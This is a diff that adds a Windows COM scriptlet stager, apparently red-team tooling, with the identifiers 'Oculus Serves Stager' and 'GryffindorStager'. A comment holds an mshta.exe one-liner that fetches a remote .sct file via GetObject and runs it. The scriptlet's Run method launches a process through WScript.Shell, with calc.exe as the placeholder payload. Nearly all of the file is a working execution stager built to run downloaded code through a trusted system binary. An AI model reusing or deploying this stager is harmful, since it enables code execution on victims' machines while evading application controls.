@@ -1,0 +1,29 @@
+<?XML version="1.0"?>
+<scriptlet>
+  <!-- Test -->
+  <!-- Oculus Serves Stager -->
+  <!-- mshta.exe javascript:a=(GetObject("script:https://127.0.0.1:80/hta.sct")).Exec();close(); -->
+
+<registration
+    description="GryffindorStager"
+    progid="GryffindorStager"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+	>
+
+</registration>
+
+<public>
+    <method name="Run"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	function Run()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	}
+
+]]>
+</script>
+</scriptlet>
